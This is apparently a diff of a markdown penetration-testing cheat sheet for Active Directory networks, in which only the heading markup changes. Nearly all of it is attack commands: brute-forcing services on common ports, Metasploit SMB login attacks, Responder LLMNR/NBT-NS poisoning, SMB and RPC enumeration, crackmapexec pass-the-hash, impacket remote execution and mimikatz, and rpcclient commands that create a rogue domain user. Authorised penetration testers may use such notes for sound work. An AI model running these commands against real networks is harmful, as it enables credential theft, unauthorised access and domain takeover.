@@ -1,11 +1,11 @@
-# Steps:-
+# <h3> Steps:-</h3>
 ```
 1. First of all we want Inventory of organization
 2. Separate IP’S of Systems, Servers, Networking Devices   
 3. Verify these IP'S Using PingInfo / AngryIPScanner
 4. Standeruser For Auth Scan but try from your END to find user/pass
 ```
-# Target 
+# <h3> Target </h3>
 ```
 For Ad Systems
 1). Getting IP
@@ -18,7 +18,7 @@ For Ad Systems
 8). Enumerate for AD Domain Password
 9). Login
 ```
-# Brute-Force As Local User On These Port's 
+# <h3> Brute-Force As Local User On These Port's </h3>
 ```
 FTP(21) 
 SSH(22) 
@@ -30,7 +30,7 @@ MYSQL(3306)
 RDP(3389) 
 VNC(5900)
 ```
-# Tool 1. TIP ( But Go For SMB First ) Only For local user account.
+# <h2> Tool 1. TIP ( But Go For SMB First ) Only For local user account. </h2>
 ```
 msfconsole
 auxiliary/scanner/smb/smb_login
@@ -52,19 +52,19 @@ set smbuser user
 set smbpass pass
 exploit
 ```
-# If AD Implemented.
+# <h3> If AD Implemented. </h3>
 ```
 set SMBDomain ADDomain 
 ```
-# If LOCKOUT Policy is Set Then Use.
+# <h3> If LOCKOUT Policy is Set Then Use. </h3>
 ```
 set ABORT_ON_LOCKOUT true
 ```
-# Tool 2. Getting USERLLMNR/NBT-NS Poising with the help of Responder.
+# <h2> Tool 2. Getting USERLLMNR/NBT-NS Poising with the help of Responder. </h2>
 ```
 sudo responder -I ens33 -wdrf
 ```
-# Tool 3. ENUM4LINUX.
+# <h2> Tool 3. ENUM4LINUX. </h2>
 ```
 enum4linux -U 10.10.0.50
 enum4linux -S 10.10.0.50
@@ -73,19 +73,19 @@ enum4linux -o 10.10.0.50
 enum4linux -U 10.10.0.50
 enum4linux -a 10.10.0.50
 ```
-# Tool 4. SMBMAP.
+# <h2> Tool 4. SMBMAP. </h2>
 ```
 smbmap -H 192.168.1.40
 smbmap -H 192.168.1.17 -u user -p pass
 
 ```
-# Tool 5. SMBCLIENT.
+# <h2> Tool 5. SMBCLIENT. </h2>
 ```
 smbclient -L //10.10.0.50/
 smbclient -L //10.10.0.50/ -U '' -N
 smbclient //10.10.0.50/tmp
 ```
-# Tool 6. KERBRUTE. 
+# <h2> Tool 6. KERBRUTE. </h2>
 ```
 msf> use auxiliary/gather/kerberos_enumusers
 gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt
@@ -102,7 +102,7 @@ enum4linux -a -u "user" -p "password" <DC IP>
 crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
 ```
 
-# Tool 7. Bloodhound.
+# <h2> Tool 7. Bloodhound. </h2>
 ```
 First Start ------>>>>> neo4j console
 Open it in browser ------>>>>> http://localhost:7474/
@@ -131,7 +131,7 @@ Login ------>>>>> user/pass
 2). Check it and enjoy it.
 ```
 
-# Tool 8. IMPACKET.
+# <h2> Tool 8. IMPACKET. </h2>
 ```
 impacket-psexec ad.domain/user:pass@IP
 impacket-wmiexec ad.domain/user:pass@IP
@@ -140,7 +140,7 @@ impacket-GetADUsers ad.domain/user:pass@IP
 impacket-mimikatz ad.domain/user:pass@IP
 impacket-smbpasswd ad.domain/user:pass@IP
 ```
-# Tool 9. RPC-Client.
+# <h2> Tool 9. RPC-Client. </h2>
 ```
 rpcclient -U ad.domain%user:pass IP
 Domain Information Query ----->>>> querydominfo
@@ -154,4 +154,4 @@ Creating Domain User  ----->>>> createdomuser hacker  ----->>>> setuserinfo2 hac
 Delete Domain User ----->>>> deletedomuser hacker
 Net Share Enumeration ----->>>> netshareenumall/netshareenum
 ```
-# Exploit Services by Searchsploit, Exploit DB
+# <h2> Exploit Services by Searchsploit, Exploit DB </h2>
